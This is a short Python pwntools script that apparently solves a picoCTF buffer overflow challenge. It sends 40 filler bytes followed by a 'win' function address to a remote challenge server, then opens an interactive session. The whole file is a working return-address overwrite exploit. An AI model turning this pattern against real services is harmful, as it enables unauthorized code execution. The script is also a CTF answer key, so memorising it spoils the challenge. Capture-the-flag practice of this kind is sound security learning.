from pwn import *

r = remote("mysterious-sea.picoctf.net" , 50402)


r.recvuntil(b"Please enter your name: ")

win_addr = 0x00401256

payload = b"a"*40 + p64(win_addr)

r.sendline(payload)

r.interactive()
